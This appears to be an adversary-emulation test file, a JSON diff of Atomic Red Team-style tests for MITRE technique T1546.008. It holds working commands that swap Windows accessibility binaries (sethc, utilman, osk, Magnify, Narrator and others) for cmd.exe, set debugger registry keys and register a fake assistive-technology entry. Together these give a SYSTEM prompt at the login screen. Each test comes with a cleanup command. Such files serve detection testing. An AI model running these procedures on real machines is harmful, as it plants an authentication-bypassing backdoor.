@@ -1,0 +1,169 @@
+{
+  "attack_technique": "T1546.008",
+  "display_name": "Event Triggered Execution: Accessibility Features",
+  "atomic_tests": [
+    {
+      "name": "Attaches Command Prompt as a Debugger to a List of Target Processes",
+      "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null\n}",
+        "procedure": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "parent_list",
+          "description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"",
+          "type": "string",
+          "default": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"
+        },
+        {
+          "arg_name": "attached_process",
+          "description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe",
+          "type": "path",
+          "default": "C:\\windows\\system32\\cmd.exe"
+        }
+      ],
+      "auto_generated_guid": "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9"
+    },
+    {
+      "name": "Replace binary of sticky keys",
+      "description": "Replace sticky keys binary (sethc.exe) with cmd.exe",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "copy /Y C:\\Windows\\System32\\sethc_backup.exe C:\\Windows\\System32\\sethc.exe",
+        "procedure": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "934e90cf-29ca-48b3-863c-411737ad44e3"
+    },
+    {
+      "name": "Create Symbolic Link From osk.exe to cmd.exe",
+      "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX",
+        "procedure": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "51ef369c-5e87-4f33-88cd-6d61be63edf2"
+    },
+    {
+      "name": "Atbroker.exe (AT) Executes Arbitrary Command via Registry Key",
+      "description": "Executes code specified in the registry for a new AT (Assistive Technologies).",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f",
+        "procedure": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\natbroker /start malware_test"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "444ff124-4c83-4e28-8df6-6efd3ece6bd4"
+    },
+    {
+      "name": "Auto-start application on user logon",
+      "description": "Executes code specified in the registry on new user logon session automatically by registration of new AT and modification of configuration value.\nThis test will register new AT named malware_test with code for cmd.exe and add a configuration value for the code to be run during user logon session.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /f",
+        "procedure": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /t REG_SZ /d malware_test /f"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "7125eba8-7b30-426b-9147-781d152be6fb"
+    },
+    {
+      "name": "Replace utilman.exe (Ease of Access Binary) with cmd.exe",
+      "description": "Replace utilman.exe (Ease of Access binary) with cmd.exe. This allows the user to launch an elevated command prompt by clicking the Ease of Access button on the login screen.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "copy /Y C:\\Windows\\System32\\utilman_backup.exe C:\\Windows\\System32\\utilman.exe",
+        "procedure": "IF NOT EXIST C:\\Windows\\System32\\utilman_backup.exe (copy C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\utilman.exe /A\nicacls C:\\Windows\\System32\\utilman.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "1db380da-3422-481d-a3c8-6d5770dba580"
+    },
+    {
+      "name": "Replace Magnify.exe (Magnifier binary) with cmd.exe",
+      "description": "Replace Magnify.exe (Magnifier binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Magnifier from the Accessibility menu on the login screen.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "copy /Y C:\\Windows\\System32\\Magnify_backup.exe C:\\Windows\\System32\\Magnify.exe",
+        "procedure": "IF NOT EXIST C:\\Windows\\System32\\Magnify_backup.exe (copy C:\\Windows\\System32\\Magnify.exe C:\\Windows\\System32\\Magnify_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Magnify.exe /A\nicacls C:\\Windows\\System32\\Magnify.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "5e4fa70d-c789-470e-85e1-6992b92bb321"
+    },
+    {
+      "name": "Replace Narrator.exe (Narrator binary) with cmd.exe",
+      "description": "Replace Narrator.exe (Narrator binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Narrator button from the Accessibility menu on the login screen.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "copy /Y C:\\Windows\\System32\\Narrator_backup.exe C:\\Windows\\System32\\Narrator.exe",
+        "procedure": "IF NOT EXIST C:\\Windows\\System32\\Narrator_backup.exe (copy C:\\Windows\\System32\\Narrator.exe C:\\Windows\\System32\\Narrator_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\Narrator.exe /A\nicacls C:\\Windows\\System32\\Narrator.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Narrator.exe"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "2002f5ea-cd13-4c82-bf73-e46722e5dc5e"
+    },
+    {
+      "name": "Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe",
+      "description": "Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt by pressing the Windows Key + P on the login screen.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "copy /Y C:\\Windows\\System32\\DisplaySwitch_backup.exe C:\\Windows\\System32\\DisplaySwitch.exe",
+        "procedure": "IF NOT EXIST C:\\Windows\\System32\\DisplaySwitch_backup.exe (copy C:\\Windows\\System32\\DisplaySwitch.exe C:\\Windows\\System32\\DisplaySwitch_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\DisplaySwitch.exe /A\nicacls C:\\Windows\\System32\\DisplaySwitch.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\DisplaySwitch.exe"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "825ba8ca-71cc-436b-b1dd-ea0d5e109086"
+    },
+    {
+      "name": "Replace AtBroker.exe (App Switcher binary) with cmd.exe",
+      "description": "Replace AtBroker.exe (App Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt from the login screen by locking and then unlocking the computer after toggling on any of the accessibility tools in the Accessibility menu.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "copy /Y C:\\Windows\\System32\\AtBroker_backup.exe C:\\Windows\\System32\\AtBroker.exe",
+        "procedure": "IF NOT EXIST C:\\Windows\\System32\\AtBroker_backup.exe (copy C:\\Windows\\System32\\AtBroker.exe C:\\Windows\\System32\\AtBroker_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\AtBroker.exe /A\nicacls C:\\Windows\\System32\\AtBroker.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\AtBroker.exe"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "210be7ea-d841-40ec-b3e1-ff610bb62744"
+    }
+  ]
+}
